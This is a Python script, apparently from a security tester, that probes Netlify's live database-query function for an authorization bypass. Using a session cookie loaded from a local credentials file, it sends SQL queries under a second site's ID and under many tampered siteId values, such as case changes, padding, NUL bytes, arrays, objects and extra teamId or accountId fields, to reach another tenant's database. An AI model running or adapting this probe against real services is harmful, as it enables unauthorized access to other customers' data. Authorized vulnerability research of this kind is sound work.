# -*- coding: utf-8 -*-
"""database-query 变异第六轮:siteId 归属校验变体(唯一越权洞型)"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A

SITE_A = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'
TEAM_A = '6a979dd2ae93f47d55b62897'
ctx = ssl.create_default_context()

def req(body):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=25)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_A,
         'Content-Type': 'application/json'}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw

def show(label, body):
    try:
        s, raw = req(body)
        print('%-52s %d %s' % (label, s, raw[:200].decode('utf-8', 'ignore').replace('\n', ' ')))
    except Exception as e:
        print('%-52s ERR %s' % (label, str(e)[:60]))

SQL = 'select current_database()'
# F1. 正常对照
show('own site normal',          {'siteId': SITE_A, 'action': 'query', 'sql': SQL})
# F2. siteId 字符串变体
show('other site (B)',           {'siteId': SITE_B, 'action': 'query', 'sql': SQL})
show('uuid uppercase',           {'siteId': SITE_A.upper(), 'action': 'query', 'sql': SQL})
show('uuid spaces',              {'siteId': ' ' + SITE_A + ' ', 'action': 'query', 'sql': SQL})
show('uuid newline',             {'siteId': SITE_A + '\n', 'action': 'query', 'sql': SQL})
show('uuid tab',                 {'siteId': SITE_A + '\t', 'action': 'query', 'sql': SQL})
show('uuid + nul',               {'siteId': SITE_A + '\x00', 'action': 'query', 'sql': SQL})
show('site name as id',          {'siteId': 'sec-test-rcf6lz', 'action': 'query', 'sql': SQL})
show('account id as id',         {'siteId': TEAM_A, 'action': 'query', 'sql': SQL})
show('site_id key',              {'site_id': SITE_A, 'action': 'query', 'sql': SQL})
show('no siteId',                {'action': 'query', 'sql': SQL})
show('siteId empty str',         {'siteId': '', 'action': 'query', 'sql': SQL})
show('siteId null',              {'siteId': None, 'action': 'query', 'sql': SQL})
# F3. 类型/结构变体
show('siteId array own',         {'siteId': [SITE_A], 'action': 'query', 'sql': SQL})
show('siteId array cross',       {'siteId': [SITE_B], 'action': 'query', 'sql': SQL})
show('siteId array both',        {'siteId': [SITE_A, SITE_B], 'action': 'query', 'sql': SQL})
show('siteId object',            {'siteId': {'id': SITE_A}, 'action': 'query', 'sql': SQL})
show('both siteId+site_id',      {'siteId': SITE_A, 'site_id': SITE_B, 'action': 'query', 'sql': SQL})
show('dup siteId key B,A',       {'siteId': SITE_B, 'action': 'query', 'sql': SQL})
show('extra teamId field',       {'siteId': SITE_B, 'teamId': TEAM_A, 'action': 'query', 'sql': SQL})
show('extra accountId field',    {'siteId': SITE_B, 'accountId': TEAM_A, 'action': 'query', 'sql': SQL})
show('extra siteName field',     {'siteId': SITE_B, 'siteName': 'sec-test-rcf6lz', 'action': 'query', 'sql': SQL})
# F4. body 整体变体
show('sql outside',              {'siteId': SITE_A, 'action': 'query'}, ),
